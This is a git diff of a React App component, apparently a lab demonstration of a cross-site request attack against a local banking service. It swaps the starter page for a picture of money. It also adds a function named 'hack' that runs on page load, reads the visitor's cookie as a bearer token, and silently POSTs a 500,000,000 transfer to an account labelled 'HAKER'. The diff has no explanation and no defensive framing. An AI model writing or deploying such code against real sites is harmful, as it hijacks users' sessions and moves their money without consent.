@@ -1,24 +1,35 @@
-import React from 'react';
-import logo from './logo.svg';
+import React, {useEffect} from 'react';
+import money from './money.jpeg';
 import './App.css';
 
 function App() {
+    const [data, setData] = React.useState("null");
+
+    const hack = async () => {
+        const test = await fetch('http://localhost:8000/transfer', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                "Authorization": "Bearer " + document.cookie.split("=")[1]
+            },
+            body: JSON.stringify({
+                "amount": 500000000,
+                "to": "HAKER",
+                "from": "TVOJ_RACUN"
+            })
+        })
+        const response = await test.json();
+        setData(response);
+    }
+
+    useEffect(() => {
+        hack();
+    }, []);
+
   return (
     <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.tsx</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
+        <img src={money} alt="euri"/>
+      <p>{JSON.stringify(data)}</p>
     </div>
   );
 }
